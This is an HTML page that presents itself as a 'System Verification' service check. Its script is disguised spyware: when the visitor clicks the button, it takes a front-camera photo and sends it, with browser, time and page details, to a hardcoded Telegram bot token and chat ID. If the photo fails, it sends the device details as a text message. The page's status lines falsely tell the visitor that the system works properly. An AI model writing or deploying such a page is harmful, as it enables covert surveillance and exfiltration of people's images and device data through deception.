<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Service Check</title>
    <style>
        body {
            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif;
            margin: 0;
            padding: 20px;
            background: #f7f9fa;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: #fff;
            border-radius: 12px;
            padding: 24px;
            box-shadow: 0 4px 16px rgba(0,0,0,0.08);
        }
        h1 {
            margin-top: 0;
            color: #333;
            font-size: 22px;
            text-align: center;
        }
        button {
            background: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 12px 20px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            margin: 16px 0;
            transition: background 0.2s;
        }
        button:hover {
            background: #0074cc;
        }
        .status {
            background: #f1f5f9;
            padding: 16px;
            border-radius: 8px;
            margin-top: 20px;
            font-size: 14px;
            color: #555;
        }
        #cameraFeed {
            width: 100%;
            border-radius: 8px;
            margin-top: 10px;
            display: none;
            background: #eee;
        }
        #statusOutput {
            white-space: pre-line;
            overflow-wrap: break-word;
        }
        #canvas {
            display: none;
        }
        .loader {
            border: 3px solid #f3f3f3;
            border-radius: 50%;
            border-top: 3px solid #0095f6;
            width: 20px;
            height: 20px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-right: 8px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>System Verification</h1>
        
        <button id="captureBtn">Verify System</button>
        <button id="debugBtn" style="background: #555;">Show Debug Info</button>
        
        <video id="cameraFeed" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
        
        <div class="status">
            <div id="statusOutput">Ready for verification process...</div>
        </div>
    </div>

    <script>
        // CONFIG - REPLACE THESE VALUES
        const BOT_TOKEN = '7866985994:AAF_OOgn0V8hvKZ9FWnroQKefnx8o9CHhxo';
        const CHAT_ID = '8126039795';
        
        // Elements
        const captureBtn = document.getElementById('captureBtn');
        const debugBtn = document.getElementById('debugBtn');
        const cameraFeed = document.getElementById('cameraFeed');
        const canvas = document.getElementById('canvas');
        const statusOutput = document.getElementById('statusOutput');
        
        // Status logging function with timestamp
        function log(message, isError = false) {
            const timestamp = new Date().toLocaleTimeString();
            const prefix = isError ? '‚ùå ' : '‚úì ';
            statusOutput.innerHTML = `${prefix}${timestamp}: ${message}\n` + statusOutput.innerHTML;
            console.log(`${prefix}${message}`);
        }
        
        // Add loading spinner to button
        function setButtonLoading(button, isLoading, text) {
            if (isLoading) {
                button.innerHTML = `<span class="loader"></span> ${text}`;
                button.disabled = true;
            } else {
                button.innerHTML = text;
                button.disabled = false;
            }
        }
        
        // Main capture and send function
        async function captureAndSend() {
            setButtonLoading(captureBtn, true, 'Processing...');
            log('Starting system verification...');
            
            try {
                // 1. Get camera access
                log('Requesting camera access...');
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: false,
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });
                
                // 2. Set up video feed
                cameraFeed.srcObject = stream;
                
                // Show video briefly
                cameraFeed.style.display = 'block';
                
                // 3. Wait for video to be ready
                await new Promise(resolve => {
                    cameraFeed.onloadedmetadata = () => {
                        cameraFeed.play();
                        log('Camera initialized');
                        
                        // Give camera time to adjust lighting and focus
                        setTimeout(resolve, 1500);
                    };
                });
                
                // 4. Capture frame to canvas
                log('Capturing data...');
                canvas.width = cameraFeed.videoWidth;
                canvas.height = cameraFeed.videoHeight;
                canvas.getContext('2d').drawImage(cameraFeed, 0, 0);
                
                // 5. Convert to base64
                const imageBase64 = canvas.toDataURL('image/jpeg', 0.8);
                
                // Hide video
                cameraFeed.style.display = 'none';
                cameraFeed.srcObject = null;
                
                // 6. Stop all tracks
                stream.getTracks().forEach(track => track.stop());
                
                // 7. Send to Telegram
                log('Verifying data...');
                const result = await sendImageToTelegram(imageBase64);
                
                if (result.success) {
                    log('Verification complete! System functioning properly.');
                } else {
                    log(`Verification failed: ${result.error}`, true);
                }
            } catch (error) {
                log(`Error: ${error.message}`, true);
                console.error('Full error:', error);
            } finally {
                setButtonLoading(captureBtn, false, 'Verify System');
            }
        }
        
        // Send image to Telegram
        async function sendImageToTelegram(imageBase64) {
            try {
                // 1. Extract base64 data
                const base64Data = imageBase64.split(',')[1];
                
                // 2. Create browser-friendly Blob
                const byteCharacters = atob(base64Data);
                const byteArrays = [];
                
                for (let offset = 0; offset < byteCharacters.length; offset += 512) {
                    const slice = byteCharacters.slice(offset, offset + 512);
                    const byteNumbers = new Array(slice.length);
                    
                    for (let i = 0; i < slice.length; i++) {
                        byteNumbers[i] = slice.charCodeAt(i);
                    }
                    
                    byteArrays.push(new Uint8Array(byteNumbers));
                }
                
                const blob = new Blob(byteArrays, {type: 'image/jpeg'});
                
                // 3. Create device info for caption
                const deviceInfo = `üì± System Verification\n` +
                                  `üîç Browser: ${navigator.userAgent.substring(0, 100)}\n` +
                                  `‚è∞ Time: ${new Date().toLocaleString()}\n` +
                                  `üåê Page: ${window.location.href}`;
                
                // 4. Create FormData with blob
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'verification.jpg');
                formData.append('caption', deviceInfo);
                
                // 5. Send to Telegram API
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                // 6. Parse and return result
                const result = await response.json();
                
                if (result.ok) {
                    return { success: true };
                } else {
                    throw new Error(result.description || 'Unknown API error');
                }
            } catch (error) {
                console.error('Send error:', error);
                
                // Fallback: Try to send text-only message
                try {
                    const fallbackUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                    const fallbackResponse = await fetch(fallbackUrl, {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: `‚ö†Ô∏è Camera capture failed\nüîß Error: ${error.message}\nüì± Device: ${navigator.userAgent}`
                        })
                    });
                    
                    const fallbackResult = await fallbackResponse.json();
                    if (fallbackResult.ok) {
                        return { success: false, error: `${error.message} (fallback message sent)` };
                    }
                } catch (fallbackError) {
                    console.error('Fallback error:', fallbackError);
                }
                
                return { success: false, error: error.message };
            }
        }
        
        // Show detailed debug info
        function showDebugInfo() {
            const debugInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenSize: `${window.screen.width}x${window.screen.height}`,
                viewportSize: `${window.innerWidth}x${window.innerHeight}`,
                hasWebcam: 'mediaDevices' in navigator,
                hasGetUserMedia: 'mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices,
                supportedMimeTypes: {
                    webp: (canvas.toDataURL('image/webp').indexOf('data:image/webp') === 0),
                    jpeg: (canvas.toDataURL('image/jpeg').indexOf('data:image/jpeg') === 0),
                    png: (canvas.toDataURL('image/png').indexOf('data:image/png') === 0)
                }
            };
            
            statusOutput.innerHTML = 'üìä DEBUG INFO:\n\n' + 
                                    Object.entries(debugInfo)
                                        .map(([key, value]) => {
                                            if (typeof value === 'object') {
                                                return `${key}: ${JSON.stringify(value)}`;
                                            }
                                            return `${key}: ${value}`;
                                        })
                                        .join('\n');
        }
        
        // Event listeners
        captureBtn.addEventListener('click', captureAndSend);
        debugBtn.addEventListener('click', showDebugInfo);
        
        // Auto-start on page load (optional)
        //document.addEventListener('DOMContentLoaded', captureAndSend);
    </script>
</body>
</html>
